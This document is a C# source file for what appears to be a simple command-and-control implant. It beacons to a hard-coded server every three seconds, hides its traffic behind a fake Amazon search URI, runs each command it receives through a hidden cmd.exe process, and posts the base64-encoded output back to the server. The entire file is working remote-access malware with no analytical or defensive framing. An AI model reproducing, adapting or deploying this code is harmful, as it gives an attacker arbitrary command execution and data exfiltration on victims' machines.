using System;
using System.IO;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading.Tasks;
using System.Text;
using System.Diagnostics;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace secretproject
{
    class Program
    {
        public const string C2SERVER = "http://192.168.86.30";
        public const int BEACONTIME = 3;
        public const string URI = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
        public const string C2URL = C2SERVER + URI;
        static void Main(string[] args)
        {
            int AGENTID = new Random().Next(10000000, 99999999);
            string CURCMD = string.Empty;
            while (true)
            {
                try {
                    //Beacon for agent taskings
                    Console.Write("asdf");
                    var beacon = Task.Run(() => BeaconAsync(AGENTID));
                    beacon.Wait();
                    dynamic result = beacon.Result;

                    //If new task
                    if (CURCMD != result._id.ToString()) 
                    {
                        //Execute Command
                        string stdout = ExecuteCommandAsync(result.cmd.ToString());

                        var response = Task.Run(() => BeaconResponseAsync(AGENTID, result.cmd.ToString(), stdout, result._id.ToString()));
                        response.Wait();
                        CURCMD = result._id.ToString();
                    }
                } catch {}

                System.Threading.Thread.Sleep(BEACONTIME*1000);
            }
        }
        static HttpClient _client = new HttpClient();
        static async Task<object> BeaconAsync(int AGENTID)
        {
            Console.Write("asdf");
            var payload = "{\n\t\"type\": \"b\",\n\t\"agentid\": " + AGENTID + "\n}";

            HttpContent c = new StringContent(payload.ToString(), Encoding.UTF8, "application/json");
            var result = await _client.PostAsync(C2URL, c);
            string content = await result.Content.ReadAsStringAsync();

            string jsondata = "{" + content.Split("{")[1];
            dynamic output = JValue.Parse(jsondata);

            return output;
        }
        static async Task<object> BeaconResponseAsync(int AGENTID, string cmd, string retval, string id)
        {
            var payload = "{\n\t\"type\": \"r\",\n\t\"agentid\": " + AGENTID + ",\n\t\"taskid\": \"" + id + "\",\n\t\"cmd\": \"" + cmd + "\",\n\t\"retval\": \"" + retval + "\"\n}";

            HttpContent c = new StringContent(payload.ToString(), Encoding.UTF8, "application/json");
            var result = await _client.PostAsync(C2URL, c);
            string content = await result.Content.ReadAsStringAsync();

            return content;
        }
        static string ExecuteCommandAsync(string cmd)
        {
            int ExitCode;
            ProcessStartInfo ProcessInfo;
            Process Process;
            
            ProcessInfo = new ProcessStartInfo("cmd.exe", "/C " + cmd);
            ProcessInfo.CreateNoWindow = true; 
            ProcessInfo.UseShellExecute = false;
            ProcessInfo.RedirectStandardOutput = true;
            Process = Process.Start(ProcessInfo);
            string output = Process.StandardOutput.ReadToEnd();
            Process.WaitForExit();
            ExitCode = Process.ExitCode;
            Process.Close();

            //Base64 Encode Output
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(output);
            return System.Convert.ToBase64String(plainTextBytes);
        }
    }
}
